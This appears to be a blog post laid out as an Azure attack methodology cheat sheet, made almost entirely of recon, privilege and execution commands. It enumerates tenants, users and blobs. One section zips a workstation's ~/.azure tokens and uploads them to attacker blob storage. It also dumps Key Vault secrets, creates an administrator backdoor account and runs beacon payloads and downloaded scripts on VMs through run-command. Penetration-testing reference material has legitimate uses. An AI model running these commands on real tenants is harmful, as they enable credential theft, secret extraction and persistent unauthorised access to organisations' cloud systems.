---
layout: '../../layouts/Post.astro'
title: 'Azure - Attack Methodology'
image: '/images/azure1'
# image: 'https://22863376c5.clvaw-cdnwnd.com/2c46b638ae8400165ec727f2390cd862/200000109-4dacc4dacf/0_0k6y3ytGb8Fjtrnr.webp?ph=22863376c5'
publishedAt: "2023-10-3"
category: 'Cloud'
---

## Overview
# Import-Modules
tokentactics
aadinternals
powerzure
microburst
roadrecon 

# Use OSINT to get the company's tenant
$tenant="anchorconst.com"
$base="anchorconst"

# Look for Open blobs from tenant name using bing as well
$bingKey = ""
Invoke-EnumerateAzureBlobs -Base $base -BingAPIKey $bingKey

# Get Login info
Get-AADIntLoginInformation -domain $tenant >> recon.json
Get-AADIntTenantId -Domain $tenant >> recon.json
Get-AADIntOpenIDConfigurations -domain $tenant >> recon.json

# AADInternals Recon
Invoke-AADIntReconAsOutsider -DomainName $tenant | Format-Table >> recon.json
cat OsintUsers.txt | Invoke-AADIntUserEnumerationAsOutsider -method autologon # -method Normal or -Login (logs to AzAd signins) 

# Look for relaying trusts
Invoke-AADIntReconAsOutsider -DomainName $tenant -GetRelayingParties # -Autologon?

# Azure Web App Exposed
If we're tasked or have access to an application running on azure, we can look at the assets on the page and the network traffic.

# images
Check each image to see if it's backed by blob storage

# network tab
Browse the app with the console open to see what network connections are being made, look for azure resources core blob file etc

# Microburst
Import-Module .\MicroBurst\MicroBurst.psm1

# Stormspotter
cd .\Stormspotter
docker-compose up

# Microburst Methodology

### Variables
$target = "straylightsecurity"

### Subdomains
Invoke-EnumerateAzureSubdomains -Base $target

### Blob container recon
Invoke-EnumerateAzureBlobs -Base $target

### CloudBrute
### Guide -  https://0xsha.io/blog/introducing-cloudbrute-wild-hunt-on-the-clouds
```bash
wget https://github.com/0xsha/CloudBrute/releases/download/v1.0.7/cloudbrute_1.0.7_Windows_x86_64.zip && unzip
cloudbrute_1.0.7_Windows_x86_64.zip  

./cloudBrute -d corpomaxllc.com -k corpomax -m storage -t 80 -T 10 -w "./data/storage_small.txt"
```

### Blobhunter
```bash
git clone https://github.com/cyberark/BlobHunter.git

cd Blobhunter

pip3 install -r requirements.txt

python3 BlobHunter.py
```

### ScoutSuite
```bash
git clone https://github.com/nccgroup/ScoutSuite.git

```

# Admin workstation steal access token
# land a admin account on a workstation, grab the access tokens for  later
$url=BLOB STORAGE YOU WANT TO SEND TO
 ls ~/.azure
 zip -r azureprofile.zip ~/.azure

 # PUT to Blob
 http PUT $url @azureprofile.zip 'x-ms-blob type: BlockBlob'

# download on attacker system
wget $url/azureprofile.zip
unzip azureprofile.zip -d azure

# Check who we are with Admin access
az account list 
az account tenant list # Current tenant info
az account subscription list # Current subscription info
az ad signed-in-user show # Current signed-in user
az ad signed-in-user list-owned-objects # Get owned objects by current user
az account management-group list #Not allowed by default

# azuread
#Get the current session state
Get-AzureADCurrentSessionInfo
#Get details of the current tenant
Get-AzureADTenantDetail

# Az Pwsh
# Get the information about the current context (Account, Tenant, Subscription etc.)
Get-AzContext
# List all available contexts
Get-AzContext -ListAvailable
# Enumerate subscriptions accessible by the current user
Get-AzSubscription
#Get Resource group
Get-AzResourceGroup
# Enumerate all resources visible to the current user
Get-AzResource
# Enumerate all Azure RBAC role assignments
Get-AzRoleAssignment # For all users
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com # For current user



# PowerZure Connect / With Token
Connect-AzAccount
$token = 'eyJ0eXAiOiJKV1QiLC....(snip)'
Connect-AzureJWT -Token $token -AccountId 93f7295a-1243-1234-1234-1a1fa41560e8

# Import
ipmo C:\Path\To\Powerzure.psd1

# Current User
Get-AzureCurrentUser
Get-AzureTarget

# Reader Commands
# Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails
# Contributor Abilities
Execute-Command 
Execute-MSBuild 
Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk
# Owner
Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest
# Administrator Backdoor
New-AzureBackdoor -Username 'PrintService' -Password 'Print-or-Die2023!'
# Scripts for Intune/extension exec
New-AzureIntuneScript -Script 'C:\temp\test.ps1'
Invoke-AzureCustomScriptExtension -VMName AzureWin10 -Command whoami
Invoke-AzureCustomScriptExtension -VM 'Windows10' -ResourceGroup 'Defaultresourcegroup-cus' -Command 'powershell.exe -c mkdir C:\test'

# Agent and Execute using userData channel
Invoke-AzureVMUserDataAgent -VM AzureWin10
Invoke-AzureVMUserDataCommand -VM AzureWin10 -Command ls
# Execute commands and msbuild payloads
Invoke-AzureRunProgram -VMName AzureWin10 -File C:\tempbeacon.exe

Invoke-AzureRunCommand -VMName AzureWin10 -Script 'C:\temp\test.ps1'
Invoke-AzureRunMSBuildd -VMName AzureWin10 -File 'C:\temp\build.xml'

# Execute runbooks
Get-AzureRunAsAccount
Get-AzureRunAsCertificate -AutomationAccount TestAccount
Get-AzureRunbookContent -All -OutFilePath 'C:\temp

Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Command whoami
Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Script "C:temptest.ps1"

# Secrets
Show-AzureKeyVaultContent -All
Show-AzureStorageContent -All

Get-AzureKeyVaultContent
Get-AzureRunAsCertificate

# CloudSploit to look for Vulns

git clone git@github.com:cloudsploit/scans.git
cd cloudsploit
npm install

# Config
$ cp config_example.js config.js

# Create azurecreds.json

{
  "ApplicationID": "YOURAZUREAPPLICATIONID",
  "KeyValue": "YOURAZUREKEYVALUE",
  "DirectoryID": "YOURAZUREDIRECTORYID",
  "SubscriptionID": "YOURAZURESUBSCRIPTIONID"
}

# Run Scan
./index.js

# Scans to standards
$ ./index.js --compliance=hipaa
$ ./index.js --compliance=pci
$ ./index.js --compliance=cis
$ ./index.js --compliance=cis1
$ ./index.js --compliance=cis2

# Print a table to the console and save a CSV file
$ ./index.js --csv=file.csv --console=table

# Print text to the console and save a JSON and JUnit file while ignoring passing results
$ ./index.js --json=file.json --junit=file.xml --console=text --ignore-ok





# VMs

# VM Run-Command section
$vmName = "VM"
$rg = "VM_rg"
$location = "eastus"
$command = ". { iwr -useb https://boxstarter.org/bootstrapper.ps1 } | iex; get-boxstarter -Force"
$scriptName = "tester"
$user = "mellonaut"
$password = ""

az vm run-command create --resource-group $rg --location $location --async-execution false --run-as-password $password --run-as-user $user --script $command --timeout-in-seconds 3600 --run-command-name $scriptName --vm-name $vmName

# script
$script = Get-Content .\tester.ps1
$script = "tester.ps1"
$command = $script
az vm run-command create --resource-group $rg --location $location --async-execution false --run-as-password $password --run-as-user $user --script $command --timeout-in-seconds 3600 --run-command-name $scriptName --vm-name $vmName

# Send script and execute
Set-AzVMRunCommand -ResourceGroupName blasbox-rg -VMName blastbox -Location "EastUS" -RunCommandName "ChocoInstall" -SourceScript "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"

# Get a Run Command instance view for a VM are Run COmmand
$x = Get-AzVMRunCommand -ResourceGroupName MyRG -VMName MyVM -RunCommandName MyRunCommand -Expand InstanceView
$x.InstanceView

# execute a script that exists on the VM
Set-AzVMRunCommand -ResourceGroupName MyRG0 -VMName MyVMEE -RunCommandName MyRunCommand -Location EastUS2EUAP -ScriptLocalPath "C:\MyScriptsDir\MyScript.ps1"

# Pass script chunked up with ';' to separate commands
Set-AzVMRunCommand -ResourceGroupName MyRG0 -VMName MyVML -RunCommandName MyRunCommand2 -Location EastUS2EUAP -SourceScript "id; echo HelloWorld"

# SourceCOmmandId create/update RunCommand
Get-AzVMRunCommandDocument
Set-AzVMRunCommand -ResourceGroupName MyRG0 -VMName MyVMEE -RunCommandName MyRunCommand -Location EastUS2EUAP -SourceCommandId DisableWindowsUpdate

# RunAs different user
Set-AzVMRunCommand -ResourceGroupName MyRG0 -VMName MyVMEE -RunCommandName MyRunCommand -Location EastUS2EUAP -ScriptLocalPath "C:\MyScriptsDir\MyScript.ps1" -RunAsUser myusername -RunAsPassword mypassword



